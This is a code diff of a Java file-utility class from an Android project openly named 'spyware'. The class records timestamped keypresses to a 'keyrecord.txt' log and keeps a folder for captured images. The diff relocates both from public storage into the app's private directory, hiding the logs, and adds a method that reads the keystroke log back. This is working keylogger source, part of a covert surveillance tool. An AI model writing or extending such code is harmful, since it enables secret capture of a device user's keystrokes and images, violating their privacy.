@@ -1,7 +1,10 @@
 package com.example.cristianturetta.spyware;
 
+import android.content.Context;
 import android.graphics.Bitmap;
+import android.os.Build;
 import android.os.Environment;
+import android.support.annotation.RequiresApi;
 import android.util.Log;
 import java.io.BufferedReader;
 import java.io.File;
@@ -19,44 +22,77 @@ import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Locale;
 
+import static android.content.Context.MODE_PRIVATE;
+
 public class FileUtil {
 
     private File malwareKeypressStorageFolder;
     private File malwareImagesStorageFolder;
     private final String keypressFileName = "keyrecord.txt";
+    private Context context;
 
     private static FileUtil mInstance;
 
     private FileUtil() {
-        malwareKeypressStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
-                "keys");
-        malwareImagesStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
-                "imgs");
+    }
 
-        if(!malwareKeypressStorageFolder.exists())
-            if (FileUtil.isExternalStorageWritable())
-                if (!malwareKeypressStorageFolder.mkdirs()) {
-                    Log.e("FileUtil", "Key directory not created");
-                }
 
-        if(!malwareImagesStorageFolder.exists())
-            if (FileUtil.isExternalStorageWritable())
-                if (!malwareImagesStorageFolder.mkdirs()) {
-                    Log.e("FileUtil", "Key directory not created");
-                }
+
+    private FileUtil(Context context) {
+        this.context=context;
+        try (FileOutputStream fileOuputStream = context.openFileOutput("a", MODE_PRIVATE)) {
+            malwareKeypressStorageFolder = new File(context.getFilesDir(),
+                    "keys");
+            malwareImagesStorageFolder = new File(context.getFilesDir(),
+                    "imgs");
+
+            if(!malwareKeypressStorageFolder.exists())
+                if (FileUtil.isExternalStorageWritable())
+                    if (!malwareKeypressStorageFolder.mkdirs()) {
+                        Log.e("FileUtil", "Key directory not created");
+                    }
+
+            if(!malwareImagesStorageFolder.exists())
+                if (FileUtil.isExternalStorageWritable())
+                    if (!malwareImagesStorageFolder.mkdirs()) {
+                        Log.e("FileUtil", "Key directory not created");
+                    }
+
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+
+
+
+
+
+
     }
 
 
     public static FileUtil getInstance() {
+        if (mInstance != null) {
+            synchronized (FileUtil.class) {
+                    return mInstance;
+            }
+        }
+        return null;
+    }
+
+    public static FileUtil init(Context context) {
         if (mInstance == null) {
             synchronized (FileUtil.class) {
-                if (mInstance == null) {
-                    mInstance = new FileUtil();
-                }
+                    mInstance = new FileUtil(context);
             }
         }
         return mInstance;
     }
+
+
+
 
 
     private static boolean isExternalStorageWritable() {
@@ -110,17 +146,24 @@ public class FileUtil {
         String time = df.format(Calendar.getInstance().getTime());
 
         // TODO check if keypressFileName exists
-        File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
-        FileWriter writer;
 
-        String toWrite = time + key;
 
         try {
+            File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
+
+            if(!malwareKeypressStorageFolder.exists()){
+                throw new FileNotFoundException();
+            }
+
+            FileWriter writer;
+
+            String toWrite = time + key;
+
             writer = new FileWriter(keypressFile, true);
             writer.append(toWrite);
             writer.flush();
             writer.close();
-        } catch (IOException e) {
+        } catch (Exception e) {
             Log.e("storeKeypress", e.getLocalizedMessage());
         }
     }
@@ -158,16 +201,25 @@ public class FileUtil {
         return sb.toString();
     }
 
-    public static String getStringFromFile(String filePath) throws Exception {
+    public String getStringFromKeypressFile() {
         try {
-            File fl = new File(filePath);
+            File fl = new File(malwareKeypressStorageFolder, keypressFileName);
+
+            if(!fl.exists()){
+                throw new FileNotFoundException();
+            }
+
             FileInputStream fin = new FileInputStream(fl);
             String ret = convertStreamToString(fin);
             //Make sure you close all streams.
             fin.close();
             return ret;
+        } catch (FileNotFoundException e) {
+            //Log.e("getStringFromKeypress", e.getLocalizedMessage());
+        } catch (IOException e) {
+            Log.e("getStringFromKeypress", e.getLocalizedMessage());
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e("getStringFromKeypress", e.getLocalizedMessage());
         }
         return null;
     }
